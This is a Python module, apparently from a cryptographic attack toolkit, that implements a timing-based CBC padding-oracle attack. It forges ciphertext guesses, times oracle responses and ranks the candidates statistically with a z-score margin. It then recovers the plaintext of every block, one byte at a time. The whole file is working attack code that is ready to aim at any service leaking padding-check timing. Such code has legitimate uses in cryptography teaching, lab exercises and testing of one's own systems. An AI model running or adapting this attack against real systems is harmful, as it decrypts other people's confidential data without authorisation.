"""Timing-oracle padding attack utilities.

This implementation keeps the original strong attack behavior, but factors the
refinement logic into shared helpers so the flow stays compact and readable.
"""

from dataclasses import dataclass
import math
from typing import Callable

from .. import crypto
from .common import (
    AttackError,
    TimingOracle,
    build_byte_recovery_base,
    decode_guess_byte,
    forge_candidate,
    require_ciphertext_with_iv,
    require_two_blocks,
)

ProgressCallback = Callable[[int], None]


@dataclass
class TimingConfig:
    """Sampling configuration for timing-based byte ranking."""

    initial_samples: int = 1
    refine_samples: int = 4
    top_candidates: int = 6
    confidence_z: float = 2.5
    min_compare_samples: int = 10
    max_queries_per_byte: int = 100_000

    def normalized(self) -> "TimingConfig":
        """Return a sanitized configuration with safe minimums/bounds."""
        return TimingConfig(
            initial_samples=max(1, int(self.initial_samples)),
            refine_samples=max(1, int(self.refine_samples)),
            top_candidates=min(256, max(1, int(self.top_candidates))),
            confidence_z=max(0.1, float(self.confidence_z)),
            min_compare_samples=max(2, int(self.min_compare_samples)),
            max_queries_per_byte=max(1, int(self.max_queries_per_byte)),
        )


@dataclass
class Score:
    """Running aggregate for one guess candidate."""

    guess: int
    total: int
    total_sq: int
    samples: int
    forged: bytes

    def avg(self) -> float:
        """Mean observed duration for this candidate."""
        return self.total / self.samples

    def variance(self) -> float:
        """Sample variance estimate of the observed durations."""
        if self.samples < 2:
            return 0.0
        mean = self.avg()
        var = (self.total_sq - (self.samples * mean * mean)) / (self.samples - 1)
        return var if var > 0.0 else 0.0


def recover_block_timing(
    prev: bytes,
    curr: bytes,
    oracle: TimingOracle,
    config: TimingConfig,
    prefix: bytes = b"",
    progress_callback: ProgressCallback | None = None,
) -> tuple[bytes, int]:
    """Recover one plaintext block from timing leakage."""
    cfg = config.normalized()

    require_two_blocks(prev, curr)
    if len(prefix) % crypto.BLOCK_SIZE != 0:
        raise AttackError("prefix must be a multiple of 16 bytes")

    intermediate = bytearray(crypto.BLOCK_SIZE)
    plaintext = bytearray(crypto.BLOCK_SIZE)
    queries = 0
    prefix_bytes = bytes(prefix)

    for pos in range(crypto.BLOCK_SIZE - 1, -1, -1):
        pad, base = build_byte_recovery_base(prev, intermediate, pos)
        byte_queries = 0

        scores: list[Score] = []
        for guess in range(256):
            _candidate_prev, forged = forge_candidate(base, pos, guess, curr, prefix=prefix_bytes)
            total, total_sq = _sample_stats_ns(oracle, forged, cfg.initial_samples)
            queries = _add_queries(queries, cfg.initial_samples, progress_callback)
            byte_queries += cfg.initial_samples
            scores.append(
                Score(
                    guess=guess,
                    total=total,
                    total_sq=total_sq,
                    samples=cfg.initial_samples,
                    forged=forged,
                )
            )

        scores.sort(key=lambda s: s.avg(), reverse=True)
        ranked = scores[: min(cfg.top_candidates, len(scores))]

        # One quick refinement pass over top-k before adaptive checks.
        consumed = _refine_round(
            ranked,
            oracle,
            refine_samples=cfg.refine_samples,
            remaining_budget=cfg.max_queries_per_byte - byte_queries,
        )
        queries = _add_queries(queries, consumed, progress_callback)
        byte_queries += consumed

        # Refine top-k until top-1 beats top-2 with confidence or budget ends.
        consumed = _refine_until_confident(
            ranked,
            oracle,
            cfg,
            remaining_budget=cfg.max_queries_per_byte - byte_queries,
        )
        queries = _add_queries(queries, consumed, progress_callback)
        byte_queries += consumed

        # Final focused refinement on current top-2 only, re-evaluated each round.
        while byte_queries < cfg.max_queries_per_byte:
            ranked.sort(key=lambda s: s.avg(), reverse=True)
            contenders = ranked[:2]
            if len(contenders) < 2:
                break
            if _is_confident(contenders[0], contenders[1], cfg):
                break
            consumed = _refine_round(
                contenders,
                oracle,
                refine_samples=cfg.refine_samples,
                remaining_budget=cfg.max_queries_per_byte - byte_queries,
            )
            queries = _add_queries(queries, consumed, progress_callback)
            byte_queries += consumed
            if consumed == 0:
                break

        ranked.sort(key=lambda s: s.avg(), reverse=True)
        best_guess = ranked[0].guess

        if pos == crypto.BLOCK_SIZE - 1 and len(ranked) > 1:
            remaining = cfg.max_queries_per_byte - byte_queries
            if remaining >= len(ranked):
                probe_samples = min(cfg.refine_samples, remaining // len(ranked))
                if probe_samples > 0:
                    best_guess, extra_queries = _resolve_last_byte_ambiguity(
                        ranked,
                        oracle,
                        prefix_len=len(prefix_bytes),
                        probe_samples=probe_samples,
                        )
                    queries = _add_queries(queries, extra_queries, progress_callback)
                    byte_queries += extra_queries

        intermediate[pos], plaintext[pos] = decode_guess_byte(prev[pos], best_guess, pad)

    return bytes(plaintext), queries


def recover_ciphertext_block_timing(
    ciphertext: bytes,
    block_index: int,
    oracle: TimingOracle,
    config: TimingConfig,
    progress_callback: ProgressCallback | None = None,
) -> tuple[bytes, int]:
    """Recover one plaintext block from a full ciphertext by index."""
    num_blocks = require_ciphertext_with_iv(ciphertext)
    if block_index < 1 or block_index >= num_blocks:
        raise AttackError(f"block index {block_index} out of range")

    prev_start = (block_index - 1) * crypto.BLOCK_SIZE
    prev_end = block_index * crypto.BLOCK_SIZE
    curr_end = (block_index + 1) * crypto.BLOCK_SIZE

    prefix = ciphertext[:prev_start]
    prev = ciphertext[prev_start:prev_end]
    curr = ciphertext[prev_end:curr_end]
    return recover_block_timing(
        prev,
        curr,
        oracle,
        config,
        prefix=prefix,
        progress_callback=progress_callback,
    )


def recover_plaintext_timing(
    ciphertext: bytes,
    oracle: TimingOracle,
    config: TimingConfig,
    progress_callback: ProgressCallback | None = None,
) -> tuple[bytes, int]:
    """Recover all plaintext blocks without stripping PKCS#7 padding."""
    num_blocks = require_ciphertext_with_iv(ciphertext)
    recovered_blocks: dict[int, bytes] = {}
    total_queries = 0

    for block_index in range(num_blocks - 1, 0, -1):
        def block_progress(block_queries: int) -> None:
            if progress_callback is not None:
                progress_callback(total_queries + block_queries)

        block, queries = recover_ciphertext_block_timing(
            ciphertext,
            block_index,
            oracle,
            config,
            progress_callback=block_progress,
        )
        recovered_blocks[block_index] = block
        total_queries += queries

    out = bytearray()
    for block_index in range(1, num_blocks):
        out.extend(recovered_blocks[block_index])
    return bytes(out), total_queries


def _sample_duration_ns(oracle: TimingOracle, ciphertext: bytes, samples: int) -> int:
    """Return sum of sampled durations for one ciphertext."""
    total, _ = _sample_stats_ns(oracle, ciphertext, samples)
    return total


def _sample_stats_ns(oracle: TimingOracle, ciphertext: bytes, samples: int) -> tuple[int, int]:
    """Return `(sum(x), sum(x^2))` over repeated oracle timings."""
    total = 0
    total_sq = 0
    for _ in range(samples):
        value = int(oracle(ciphertext))
        total += value
        total_sq += value * value
    return total, total_sq


def _refine_round(
    candidates: list[Score],
    oracle: TimingOracle,
    refine_samples: int,
    remaining_budget: int,
) -> int:
    """Add one refinement round across candidates and return consumed queries."""
    consumed = 0
    for candidate in candidates:
        left = remaining_budget - consumed
        if left <= 0:
            break
        samples = min(refine_samples, left)
        if samples <= 0:
            break
        extra, extra_sq = _sample_stats_ns(oracle, candidate.forged, samples)
        candidate.total += extra
        candidate.total_sq += extra_sq
        candidate.samples += samples
        consumed += samples
    return consumed


def _refine_until_confident(
    candidates: list[Score],
    oracle: TimingOracle,
    cfg: TimingConfig,
    remaining_budget: int,
) -> int:
    """Refine candidates until top-1 is confident over top-2 or budget runs out."""
    consumed = 0
    while consumed < remaining_budget:
        candidates.sort(key=lambda s: s.avg(), reverse=True)
        if len(candidates) < 2:
            break
        if _is_confident(candidates[0], candidates[1], cfg):
            break
        added = _refine_round(
            candidates,
            oracle,
            refine_samples=cfg.refine_samples,
            remaining_budget=remaining_budget - consumed,
        )
        consumed += added
        if added == 0:
            break
    return consumed


def _is_confident(best: Score, second: Score, cfg: TimingConfig) -> bool:
    """Test whether top candidate is separated by a Z-score-like margin."""
    if best.samples < cfg.min_compare_samples or second.samples < cfg.min_compare_samples:
        return False
    gap = best.avg() - second.avg()
    if gap <= 0:
        return False
    se = math.sqrt((best.variance() / best.samples) + (second.variance() / second.samples))
    if se <= 0:
        return True
    return gap > (cfg.confidence_z * se)


def _resolve_last_byte_ambiguity(
    candidates: list[Score],
    oracle: TimingOracle,
    prefix_len: int,
    probe_samples: int,
) -> tuple[int, int]:
    """Pick the most stable pad=1 guess using a targeted perturbation probe."""
    probe_pos = prefix_len + crypto.BLOCK_SIZE - 2
    best_guess = candidates[0].guess
    best_probe_avg = float("-inf")
    queries = 0

    for candidate in candidates:
        probe = bytearray(candidate.forged)
        probe[probe_pos] ^= 0x01
        total = _sample_duration_ns(oracle, bytes(probe), probe_samples)
        queries += probe_samples
        avg = total / probe_samples
        if avg > best_probe_avg:
            best_probe_avg = avg
            best_guess = candidate.guess

    return best_guess, queries


def _add_queries(
    current_queries: int,
    delta: int,
    progress_callback: ProgressCallback | None,
) -> int:
    """Increase query count and emit progress callback if configured."""
    if delta <= 0:
        return current_queries
    updated = current_queries + delta
    if progress_callback is not None:
        progress_callback(updated)
    return updated
